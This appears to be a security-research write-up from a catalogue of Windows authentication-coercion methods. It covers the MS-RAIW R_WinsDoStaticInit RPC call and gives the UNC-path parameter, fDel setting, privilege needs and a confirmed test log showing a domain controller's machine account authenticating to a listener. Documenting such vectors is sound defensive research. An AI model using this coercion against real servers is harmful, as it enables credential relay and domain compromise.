# MS-RAIW - Remote call to R_WinsDoStaticInit (opnum 3)

## Summary

+ **Protocol**: [[MS-RAIW]: Remote Administrative Interface: WINS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9)

+ **Protocol UUID**: 45f52c28-7f9f-101a-b52b-08002b2efabe

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\pipe\WinsPipe` (also reachable over `ncacn_ip_tcp` via the endpoint mapper)

+ **Function name**: [`R_WinsDoStaticInit`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/e33043ac-715d-4476-9aad-f2827f9d9ec5)

+ **Function operation number**: `3`

+ **Authenticated**: Yes (WINS control-level access)

## Description

`R_WinsDoStaticInit` performs static initialization of the WINS database by reading an LMHOSTS-style
text file **from a caller-specified path** and registering the entries it contains. Because the
server opens and reads that path immediately, and the specification defines **no UNC or traversal
validation** on `pDataFilePath`, a UNC path makes the WINS server (running as the machine account)
read from it — coercing authentication.

Per [MS-RAIW] 3.1.4.3:

> **pDataFilePath**: A pointer to a Unicode string containing the path to a text file on the target WINS server.
> - The R_WinsDoStaticInit caller SHOULD have control level access. If an RPC client with a lower access level calls this method, the server SHOULD return ERROR_ACCESS_DENIED.
> - The WINS server retrieves the entries from the specified file and registers the retrieved names into the WINS database.
> - After the WINS server finishes the initialization, it removes the file if *fDel* is set to a nonzero value.

This is the cleanest of the WINS vectors: `pDataFilePath` is a plain **LPWSTR** (simple marshalling,
unlike the LPBYTE of `R_WinsBackup`), the read is immediate and synchronous, and passing **`fDel = 0`**
means the server does not attempt to delete the file afterwards — so the call is non-destructive to
the listener side and does not depend on delete semantics.

### Conditions

+ **Privilege**: WINS **control-level access** (WINS admins). Not low-privilege.
+ **Prerequisite calls**: none. `ServerHdl` is the RPC binding handle.
+ **Trigger**: immediate synchronous read of `pDataFilePath`.
+ **Coerced parameter**: `pDataFilePath` (LPWSTR), e.g. `\\<listener>\share\lmhosts`. Set **`fDel = 0`**.

## Function technical detail

```cpp
DWORD R_WinsDoStaticInit(
   [in] handle_t ServerHdl,
   [in, unique, string] LPWSTR pDataFilePath,
   [in] DWORD fDel
 );
```

+ **pDataFilePath**: LPWSTR path to an LMHOSTS-format file the server reads. No UNC/traversal restriction in the spec. If NULL, the server defaults to `%systemroot%\system32\drivers\etc\lmhosts`.
+ **fDel**: nonzero → delete the file after init. Use `0` for a clean, non-destructive coercion.

## Testing status — CONFIRMED

**Confirmed coercion on Windows Server 2025** (domain controller with the WINS feature installed),
2026-09-12. Bound the RAIW interface (`45f52c28-…`) over `ncacn_ip_tcp` (EPM), authenticated as an
administrator, listener on the UNC path:

```
R_WinsDoStaticInit(pDataFilePath="\\<listener>\share\lmhosts.txt", fDel=0)   [opnum 3]
  -> ERROR_STATIC_INIT_FAILED
  -> listener: Incoming connection; TMP-W-2025-DC1$ authenticated successfully
```

The WINS server (machine account) connected to the listener and authenticated **immediately** when
it went to read the data file. `ERROR_STATIC_INIT_FAILED` is the expected tail — the listener does
not serve a real LMHOSTS file, but the outbound authentication (the coercion) has already happened.
`fDel = 0` keeps it non-destructive. This is the cleanest of the WINS vectors (plain LPWSTR,
read-only, no delete). Requires WINS control-level access.

## References

+ Documentation of protocol [MS-RAIW]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9

+ Documentation of function `R_WinsDoStaticInit` (opnum 3): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/e33043ac-715d-4476-9aad-f2827f9d9ec5
